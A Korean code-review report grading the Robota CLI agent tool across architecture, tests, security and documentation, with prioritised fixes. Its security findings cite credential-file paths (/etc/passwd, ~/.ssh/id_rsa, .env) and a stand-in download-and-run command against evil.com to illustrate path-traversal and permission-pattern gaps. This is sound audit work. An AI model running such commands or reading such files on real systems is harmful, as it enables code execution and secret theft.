# Robota CLI — 시니어 개발자 완성도 보고서

생성일: 2026-05-24  
분석 버전: @robota-sdk/agent-cli v3.0.0-beta.67  
분석자 관점: 10년 경력 TypeScript/Node.js 시니어 개발자

---

## 요약 (TL;DR)

Robota CLI는 **구조적으로 매우 잘 설계**된 프로젝트다. 레이어 분리, 타입 안전성, SPEC.md 기반 계약 주도 개발 모두 업계 수준 이상이다. 그러나 세 가지 핵심 갭이 베타 → 안정화를 가로막고 있다:

1. **TUI 모드 테스트 전무**: 25개 소스 파일 중 TUI 관련 테스트가 0개. 전체 대화형 모드 코드가 테스트되지 않은 채 출시된다.
2. **보안 설계 불완전성**: Read/Write/Edit 도구에 경로 순회(path traversal) 차단이 없다. `../` 경로로 작업 디렉터리 밖 임의 파일에 접근 가능.
3. **Bash 타임아웃 캡 미적용**: 도구 스키마는 "max 600000"라고 설명하지만 코드에서 실제로 캡을 적용하지 않는다. LLM이 `timeout: 999999999`를 전달하면 그대로 통과.

종합 점수: **7.2 / 10**

---

## 1. 기술 완성도 평가

### 점수: 7.5 / 10

**잘 된 것들:**

`cli-args.ts`의 인자 파싱은 순수 함수로 구현되어 부작용이 없고, 유효하지 않은 값에 대해 즉시 예외를 던진다. `parsePermissionMode`, `parseOutputFormat`, `parseMaxTurns` 모두 입력 유효성 검사 후 타입 좁히기(type narrowing)를 명시적으로 수행한다(라인 95-121).

`cli.ts`의 4-레이어 스타트업 파이프라인(pre-flight → config → assembly → transport)은 관심사가 명확히 분리되어 있다. 각 레이어가 독립적으로 실패할 수 있고 오류가 올바른 레이어에서 잡힌다.

`print-mode.ts`의 stdin 파이프 처리(`resolvePrompt`)는 `!process.stdin.isTTY` 조건과 async iteration을 올바르게 조합한다.

`first-run.ts`의 온보딩 마커는 `~/.robota/onboarded` 파일을 사용하며, ISO 타임스탬프를 기록해 언제 온보딩되었는지 추적 가능하다.

**버그 및 엣지케이스:**

**[버그 1] `cli-args.ts` 라인 127: `-p` 플래그 타입 불일치**

```typescript
p: { type: 'boolean', short: 'p', default: false },
```

`--print-mode`는 `boolean`으로 파싱되어 있다. 사용자가 `robota -p "my prompt"`를 입력하면 `-p`는 `true`로 설정되고 `"my prompt"`는 positional argument로 처리된다. 이는 의도된 동작이나, help 텍스트(라인 59)에서 `-p <prompt>` 형태로 표기해 혼동을 준다. 실제 프롬프트는 `-p` 뒤 positional에서 온다.

**[버그 2] `print-mode.ts` 라인 12-27: stdin과 positional 혼용 시 예측 불가 동작**

```typescript
let prompt = opts.positional.join(' ').trim();
if (!prompt && !process.stdin.isTTY) {
  // stdin 읽기
}
```

`-p "hello"` + stdin 파이프 동시 사용 시 positional이 있으므로 stdin을 무시한다. 이는 `cat file.ts | robota -p "Review this code"` 패턴을 지원하지 못한다. README(라인 143)에서 이 패턴을 예시로 들고 있지만 실제로는 동작하지 않는다.

**[버그 3] `bash-tool.ts` 라인 87-97: 타임아웃 시 이중 settle 가능성**

```typescript
const timer = setTimeout(() => {
  timedOut = true;
  child.kill('SIGTERM');
  settle({ ... error: `Command timed out after ${timeout}ms` });
}, timeout);

child.on('close', (code) => {
  if (timedOut) {
    settle({ ... }); // 두 번째 settle — settled 체크로 막히지만 race condition 있음
  }
```

`timedOut`이 `true`일 때 `close` 이벤트에서 다시 `settle`을 호출한다. `settle` 함수 내 `if (settled) return` 가드가 있어 실제 이중 실행은 방지되지만, 코드 경로 분기가 불필요하게 복잡하다. 타임아웃 후 `close` 핸들러에서 그냥 return만 해도 충분하다.

---

## 2. 아키텍처 분석

### 점수: 9.0 / 10

**계층 구조:**

```
bin.ts (프로세스 진입, IME 에러 핸들링)
  └── cli.ts (4-레이어 조립 파이프라인)
        ├── Layer 0: handlePreflightCommands (init/diagnose/help/version/--check-update)
        ├── Layer 1: IParsedCliArgs → typed option objects
        ├── Layer 2: createCommandSetup / createProviderSetup / createSessionSetup
        ├── Layer 3: createAgentRuntime (프레임워크 위임)
        └── Layer 4: runPrintMode | runTuiMode
```

SPEC.md(1,526줄)가 패키지 소유권을 명확히 정의한다. agent-cli는 다음을 **소유하지 않는다**: Session, SessionStore, Tools, Permissions, Config/Context Loading, TUI 컴포넌트. 이는 올바른 의존성 방향이다.

**의존성 흐름:**

`agent-cli` → `agent-framework` (facade) → `agent-session`, `agent-tools`, `agent-core`

CLI가 `agent-session`이나 `agent-tools`를 직접 임포트하지 않는 것이 SPEC 계약에서 확인된다. `provider-setup.ts`는 `@robota-sdk/agent-framework`에서만 임포트한다.

**SOLID 준수:**

- **단일 책임**: `cli-args.ts`(파싱), `diagnose-command.ts`(진단), `print-mode.ts`(헤드리스) 각각 명확한 단일 책임.
- **개방/폐쇄**: `IProviderDefinition[]` 주입으로 프로바이더 추가 시 CLI 코드 수정 불필요.
- **인터페이스 분리**: `IPreflightContext`, `IProviderSetup`, `ISessionSetup` 등 목적별 인터페이스.
- **의존성 역전**: `createAgentRuntime`에 `provider: IAIProvider` 추상 타입 전달.

**아키텍처 우려 사항:**

`cli.ts` 라인 119:

```typescript
process.exit(0);
```

TUI 모드가 끝난 뒤 명시적 `process.exit(0)` 호출은 비동기 리소스가 정상 종료되지 않을 수 있다. `process.exit`는 이벤트 루프를 즉시 강제 종료한다. 정상적인 패턴은 `return`으로 `main()` 함수를 종료하거나 리소스를 명시적으로 정리한 뒤 종료하는 것이다.

---

## 3. 에러 핸들링

### 점수: 7.0 / 10

**잘 된 것들:**

`diagnose-command.ts`의 `checkNetwork()`는 TCP 소켓을 직접 열어 3초 타임아웃으로 `api.anthropic.com:443`을 확인한다. `socket.on('error')`로 에러를 구조화된 결과로 변환해 사용자에게 `warn`으로 제시한다. 네트워크 에러가 크래시를 일으키지 않는 올바른 패턴이다.

`web-fetch-tool.ts`의 `classifyFetchError()`는 `ENOTFOUND`, `ECONNREFUSED`, `ECONNRESET`, `ETIMEDOUT`, SSL 에러를 각각 명확한 사용자 메시지로 변환한다. LLM이 재시도 여부를 판단할 수 있도록 "Do not retry" 또는 "retrying may help" 힌트를 포함한다.

`permission-enforcer.ts` 라인 100의 주석:

```typescript
// Must NEVER throw — if this throws, the execution round records the
// assistant tool_use in history but never adds a tool_result, which
// corrupts the conversation and causes a 400 error on the next API call.
```

이 주석은 API 계약 이유를 명확히 설명한다. 래퍼 함수가 모든 예외를 `try/catch`로 잡아 구조화된 에러 결과로 반환하는 패턴이 올바르다.

**문제점:**

**[에러 핸들링 갭 1] `session-setup.ts` 예외 전파:**

```typescript
// session-setup.ts 라인 29
throw new Error(`Session not found: ${opts.resumeId}`);
```

`cli.ts`에서 `createSessionSetup`을 호출하는 코드에 `try/catch`가 없다. 이 예외가 `startCli().catch`까지 전파되어 에러 메시지가 `stderr`에 출력되고 `process.exit(1)`이 호출된다. 기능적으로는 동작하지만 계층별 에러 처리 일관성이 부족하다.

**[에러 핸들링 갭 2] `init-command.ts`의 `JSON.parse` 미보호:**

```typescript
// init-command.ts 라인 52
const raw = readFileSync(settingsPath, 'utf8');
return JSON.parse(raw) as Record<string, unknown>;
```

`.claude/settings.json`이 손상된 JSON일 경우 `SyntaxError`가 발생하고 `init` 커맨드가 크래시한다. 마이그레이션 경로에서 사용자 파일을 읽을 때는 반드시 `try/catch`로 감싸야 한다.

**[에러 핸들링 갭 3] `web-search-tool.ts`의 네트워크 에러 분류 누락:**

`web-fetch-tool.ts`와 달리 `web-search-tool.ts`에는 `classifyFetchError` 같은 에러 분류가 없다. 네트워크 에러가 원시 에러 메시지로 LLM에 전달된다.

---

## 4. 테스트 커버리지

### 점수: 5.5 / 10

**현황 (실제 실행 결과):**

| 패키지          | 테스트 파일 | 테스트 케이스 | 결과      |
| --------------- | ----------- | ------------- | --------- |
| agent-cli       | 7           | 86            | 전체 통과 |
| agent-tools     | 6           | 109           | 전체 통과 |
| agent-session   | 10          | 60            | 전체 통과 |
| agent-transport | 49          | 411           | 전체 통과 |

**심각한 커버리지 갭:**

**[갭 1] TUI 모드 테스트 전무:**

`tui-mode.ts`는 테스트가 없다. 이 파일은 TuiTransport 생성, 6개의 구성 옵션 조합, startupUpdateNotice Promise 처리를 담당한다. 대화형 모드의 전체 진입점이 테스트되지 않는다.

**[갭 2] `diagnose-command.ts` 테스트 없음:**

`checkNetwork()`, `checkApiKey()`, `checkSettingsFile()`, `checkTerminal()` 등 진단 로직이 모두 테스트되지 않는다. 25개 소스 파일 중 7개만 테스트 파일이 있다(테스트 비율 28%).

**[갭 3] `init-command.ts` 테스트 없음:**

Claude Code 호환성 마이그레이션 경로(`readClaudeSettings` → 권한 병합)가 테스트되지 않는다.

**[갭 4] `web-search-tool.ts` 네트워크 에러 경로 테스트 없음:**

`agent-tools`에는 `web-fetch-tool`이나 `web-search-tool`에 대한 테스트 파일이 없다. 네트워크 에러 처리, 타임아웃, 대용량 응답 처리가 테스트되지 않는다.

**[갭 5] Grep 도구의 정규식 에러 처리 테스트 없음:**

`grep-tool.ts` 라인 163-169의 잘못된 정규식 입력 처리가 테스트되지 않는다.

**긍정적 측면:**

`print-mode-integration.test.ts`와 `headless-e2e.test.ts`는 실제 `InteractiveSession` + `HeadlessTransport`를 조합한 통합 테스트로, 단순 단위 테스트를 넘어 실제 실행 경로를 검증한다. `permission-enforcer-session-allow.test.ts`(12개 케이스)는 세션 승인 권한의 복잡한 상태를 꼼꼼히 검증한다.

---

## 5. 보안

### 점수: 6.0 / 10

**잘 된 것들:**

권한 시스템의 3단계 평가(`deny list → allow list → mode policy`)가 명확하고 결정론적이다. `permission-gate.ts`의 `evaluatePermission`은 모드별 정책 매트릭스를 선언적으로 정의하고, 알 수 없는 도구에 대해 fail-safe 기본값(`approve` 또는 `deny`)을 적용한다.

`plan` 모드에서 Bash, Write, Edit를 모두 `deny`로 처리하는 것은 올바른 read-only 격리다.

`settings.json`에서 `"apiKey": "$ENV:ANTHROPIC_API_KEY"` 형태로 환경 변수 참조를 지원해 설정 파일에 API 키를 평문으로 저장하지 않도록 권장한다. 평문 저장 시 경고도 출력된다(`provider-startup.test.ts` stdout 확인).

**심각한 보안 문제:**

**[보안 문제 1] 경로 순회(Path Traversal) 보호 없음:**

`read-tool.ts`, `write-tool.ts`, `edit-tool.ts` 모두 파일 경로를 검증하지 않는다. 스키마에서 절대 경로를 요구(`The absolute path`)하지만 실제 강제는 없다. LLM이 다음 경로를 전달할 수 있다:

```
/etc/passwd
~/.ssh/id_rsa
../../../.env
```

샌드박스 없는 로컬 모드에서 `bypassPermissions`가 기본값인 print 모드(`print-mode.ts` 라인 52)에서는 이러한 접근이 아무런 제어 없이 허용된다.

**비교**: `workspace-manifest.ts`의 `validateWorkspaceManifestPath()`는 경로 순회를 차단하는 올바른 검증을 구현하고 있다. 동일한 패턴이 Read/Write/Edit 도구에도 필요하다.

**[보안 문제 2] Bash 타임아웃 캡 미적용:**

```typescript
// bash-tool.ts 라인 26
.describe('Optional timeout in milliseconds (max 600000).')
```

스키마 설명에 "max 600000"이라고 적혀 있지만 `runBash` 함수에서 이 제한을 실제로 적용하지 않는다. `Math.min(timeout, 600_000)` 클램핑이 없다. LLM 또는 악의적 입력이 임의로 큰 타임아웃을 설정 가능하다.

**[보안 문제 3] `--api-key` 플래그의 CLI 히스토리 노출:**

```typescript
// cli-args.ts 라인 154
'api-key': { type: 'string' },
```

`robota --api-key sk-ant-xxxxx`처럼 사용하면 API 키가 셸 히스토리(`~/.zsh_history`)에 평문으로 기록된다. 민감한 값에 대해 환경 변수 사용을 강제하거나 경고를 표시해야 한다.

**[보안 문제 4] 권한 패턴 매칭의 경로 세그먼트 제한 없음:**

```typescript
// permission-gate.ts 라인 43
.replace(/\*/g, '.*'); // * → zero-or-more any char (shell-style, not path-segment restricted)
```

주석에서 스스로 "path-segment restricted가 아님"을 인정한다. `Bash(git *)` 패턴은 `git status`뿐만 아니라 `git clone https://evil.com/payload.sh && sh payload.sh`도 매칭한다. `*`가 공백도 매칭하기 때문이다. 이는 의도적 설계 선택일 수 있으나 보안 함의를 문서화해야 한다.

---

## 6. 성능

### 점수: 7.5 / 10

**스타트업 시간:**

`tsdown.config.ts`에서 빌드 시 `minify: true`, `treeshake: true`를 적용한다. Node.js 버전 체크가 build-time banner IIFE로 주입되어 모듈 로드 전에 실행된다(라인 18). 이는 불필요한 모듈 초기화를 피하는 올바른 패턴이다.

`cli.ts`는 레이어별로 조건부 early return을 구현해 `--help`, `--version`, `diagnose` 등 단순 커맨드는 전체 provider/session 스택을 초기화하지 않는다.

**메모리 관리:**

README에서 메시지 윈도잉(최근 100개 유지), 도구 상태 정리(최근 50개), `React.memo`를 통한 불필요한 리렌더 방지를 언급한다. 이는 장시간 세션에서의 메모리 누수를 방지하는 올바른 접근이다.

**대용량 출력 처리:**

`truncateToolResult()`가 30K 문자 제한을 적용하며, 중간 내용을 잘라내고(head 15K + tail 15K) 잘린 위치에 요약 메시지를 삽입한다. 이는 LLM 컨텍스트 제한 내에서 최대 유용한 정보를 제공하는 합리적인 전략이다.

**성능 우려 사항:**

**[성능 이슈 1] `grep-tool.ts` 순차적 파일 읽기:**

```typescript
for (const filePath of files) {
  let content: string;
  try {
    const buffer = await readFile(filePath);
```

파일을 하나씩 순차적으로 읽는다. `Promise.all` 또는 `p-limit`를 사용한 병렬 처리가 대규모 코드베이스에서 훨씬 빠를 것이다. 수천 개 파일 검색 시 성능 병목이 된다.

**[성능 이슈 2] `glob-tool.ts`의 mtime 조회 N+1:**

```typescript
const withMtime = await Promise.all(
  matches.map(async (p) => {
    const absPath = resolve(cwd, p);
    const s = await stat(absPath);
```

`Promise.all`로 병렬 처리하지만 1000개 파일에 대해 1000개의 `stat` 시스템 콜을 동시에 발생시킨다. 파일 수가 많은 프로젝트에서 I/O 폭발을 일으킬 수 있다.

---

## 7. 누락된 기능 (개발자 관점)

### 점수: 6.5 / 10

**있어야 할 기능:**

**[누락 1] `--model` 플래그 없음:**

README(라인 98)에 `robota --model <model>`이 예시로 나와 있지만, `cli-args.ts`에서 `--model` 옵션이 정의되어 있지 않다. `IParsedCliArgs` 인터페이스에도 없다. 문서와 구현이 불일치한다.

**[누락 2] 로컬 파일 기반 도구들에 대한 `--no-tools` 또는 도구 비활성화 플래그:**

`--allowed-tools`로 허용 도구 목록을 지정할 수 있지만, 모든 도구를 비활성화하거나 특정 도구를 제외하는 `--denied-tools` 플래그가 없다. 순수 대화 모드(도구 없이)를 실행할 방법이 없다.

**[누락 3] 구조화된 오류 코드:**

print 모드에서 에러 시 `process.exit(1)`만 사용한다. CI/CD 파이프라인에서 에러 유형(API 에러 vs 도구 실패 vs 타임아웃)을 구분할 수 없다. `stream-json` 포맷의 에러 이벤트에 오류 코드가 없다.

**[누락 4] `robota --validate-session` 커맨드:**

README의 슬래시 커맨드 목록에 `/validate-session`이 언급되어 있으나 `preflight.ts`에 없다. 슬래시 커맨드 내부에서만 동작하는 것으로 보이나 CLI 레벨 세션 유효성 검사가 없다.

**[누락 5] WebSearch 도구의 기본 검색 엔진 폴백:**

`BRAVE_API_KEY`가 없으면 WebSearch가 완전히 비활성화된다. Google Custom Search, DuckDuckGo HTML 파싱, 또는 다른 무료 옵션으로의 폴백이 없다. 이는 도구를 사실상 선택적 기능으로 만든다.

**[누락 6] `diagnose` 커맨드에서 설정 파일 유효성 검사 없음:**

`checkSettingsFile()`은 파일 존재 여부만 확인하고 JSON 문법 오류나 스키마 불일치를 검증하지 않는다. 손상된 설정 파일은 나중에 실제 실행 시 크래시로 나타난다.

---

## 8. 문서화 품질

### 점수: 8.5 / 10

**SPEC.md:**

`packages/agent-cli/docs/SPEC.md`는 1,526줄로 매우 상세하다. 소유권 계약("Does NOT own"), 임포트 규칙 테이블, 아키텍처 다이어그램, TUI 경계 정의가 명확하다. 이 수준의 SPEC은 신규 기여자가 어디서 무엇을 수정해야 할지 즉시 이해할 수 있게 한다.

**README.md:**

481줄로 포괄적이다. 환경 변수 테이블, 권한 모드 매트릭스, 설정 파일 예시(JSON), 슬래시 커맨드 목록, 세션 관리 플래그가 모두 포함되어 있다. 아키텍처 ASCII 다이어그램(라인 436-455)은 레이어 구조를 시각적으로 설명한다.

**인라인 JSDoc:**

`cli-args.ts`의 각 함수에 JSDoc이 있다. `bash-tool.ts`, `read-tool.ts`, `edit-tool.ts` 모두 모듈 레벨 문서와 함수 레벨 주석이 있다. `permission-gate.ts`는 패턴 문법, 결정 로직, 예시를 모두 주석으로 설명한다.

**문서 갭:**

**[문서 갭 1] `--model` 플래그 문서 vs. 구현 불일치:**

README 라인 98에 `robota --model <model>`이 예시로 나와 있지만 구현에 없다.

**[문서 갭 2] 보안 trade-off 미문서화:**

Print 모드의 기본값 `bypassPermissions`(라인 52, `print-mode.ts`)에 대한 보안 함의가 README에 경고 없이 기술되어 있다. 스크립팅 컨텍스트에서 이 기본값의 위험성을 명시해야 한다.

**[문서 갭 3] WebSearch 의존성 미명시:**

WebSearch가 `BRAVE_API_KEY`에 의존한다는 사실이 README의 도구 목록 표(라인 172-181)에 언급되지 않는다. 환경 변수 테이블(라인 50-55)에도 `BRAVE_API_KEY`가 없다.

---

## 9. 베타 → 안정화 블로커

### 기술적 블로커 (v3.0.0-stable 릴리즈 차단)

**[블로커 1] 경로 순회 보안 갭 — 심각도 HIGH**

- 위치: `packages/agent-tools/src/builtins/read-tool.ts`, `write-tool.ts`, `edit-tool.ts`
- 문제: 파일 경로 검증 없음. `/etc/passwd`, `~/.ssh/id_rsa` 등 임의 경로 접근 가능.
- 수정 방법: `validateWorkspaceManifestPath()` 패턴을 참조해 CWD 범위 내 경로만 허용하는 가드 추가, 또는 명시적으로 "tool은 임의 절대 경로를 처리함" 보안 문서 작성.

**[블로커 2] TUI 모드 테스트 완전 부재 — 심각도 HIGH**

- 위치: `packages/agent-cli/src/modes/tui-mode.ts`, 관련 TUI 컴포넌트
- 문제: 사용자가 주로 사용하는 대화형 모드 코드 경로가 전혀 검증되지 않음.
- 수정 방법: TUI 컴포넌트의 옵션 매핑 검증을 위한 단위 테스트 추가. 실제 Ink 렌더링 테스트가 어려우면 `TuiTransport` 생성 파라미터 검증 테스트라도 추가.

**[블로커 3] 문서 vs. 구현 불일치(`--model` 플래그) — 심각도 MEDIUM**

- 위치: `packages/agent-cli/README.md` 라인 98, `packages/agent-cli/src/utils/cli-args.ts`
- 문제: README에 `--model` 예시가 있지만 구현되어 있지 않다. 사용자가 시도하면 무시되거나 오류가 발생한다.
- 수정 방법: `--model` 플래그 구현, 또는 README에서 해당 예시 제거.

**[권고 1] Bash 타임아웃 캡 적용 — 심각도 MEDIUM**

- 위치: `packages/agent-tools/src/builtins/bash-tool.ts` 라인 40
- 문제: 스키마에 "max 600000"이라 설명하지만 코드에서 적용하지 않음.
- 수정: `const effectiveTimeout = Math.min(timeout, 600_000);`

**[권고 2] `init-command.ts` JSON.parse 보호 — 심각도 LOW**

- 위치: `packages/agent-cli/src/init/init-command.ts` 라인 52
- 수정: `readClaudeSettings` 함수에 `try/catch` 추가.

**[권고 3] `cli.ts` 종료 방식 — 심각도 LOW**

- 위치: `packages/agent-cli/src/cli.ts` 라인 119
- 문제: TUI 종료 후 `process.exit(0)` 호출이 비동기 리소스 정리를 건너뜀.
- 수정: `return` 또는 명시적 리소스 shutdown 후 종료.

---

## 10. 종합 점수 및 권고사항

### 영역별 점수

| 영역            | 점수         |
| --------------- | ------------ |
| 기술 완성도     | 7.5 / 10     |
| 아키텍처        | 9.0 / 10     |
| 에러 핸들링     | 7.0 / 10     |
| 테스트 커버리지 | 5.5 / 10     |
| 보안            | 6.0 / 10     |
| 성능            | 7.5 / 10     |
| 누락된 기능     | 6.5 / 10     |
| 문서화          | 8.5 / 10     |
| **종합**        | **7.2 / 10** |

### 권고사항 우선순위

**즉시 수정 (v3.0.0-stable 전):**

1. **경로 순회 방어**: Read/Write/Edit 도구에 경로 검증 추가. `bypassPermissions` 기본값인 print 모드에서 특히 중요.
2. **TUI 모드 기본 테스트 추가**: `runTuiMode` 함수의 파라미터 매핑 검증 최소 5개 케이스.
3. **Bash 타임아웃 캡 적용**: `Math.min(timeout, 600_000)` 한 줄 추가.
4. **README `--model` 예시 수정**: 구현하거나 제거.

**단기 (v3.0.0-stable 이후 첫 패치):**

5. **`init-command.ts` JSON 파싱 보호**: Claude Code 마이그레이션 경로의 예외 처리.
6. **WebSearch 환경 변수 문서화**: README 환경 변수 테이블에 `BRAVE_API_KEY` 추가.
7. **`web-search-tool.ts` 에러 분류**: `classifyFetchError` 패턴 적용.
8. **`diagnose` 커맨드 설정 파일 JSON 검증**: 존재 여부만이 아닌 내용 검증.

**중기 (v3.1.0):**

9. **Grep 도구 병렬화**: `Promise.all` 또는 `p-limit`로 파일 읽기 병렬 처리.
10. **구조화된 에러 코드**: print 모드 exit code 체계화.

---

_이 보고서는 소스 코드 직접 분석 기반이며 실제 테스트 실행(86/109/60/411 케이스 전체 통과 확인) 결과를 포함한다._
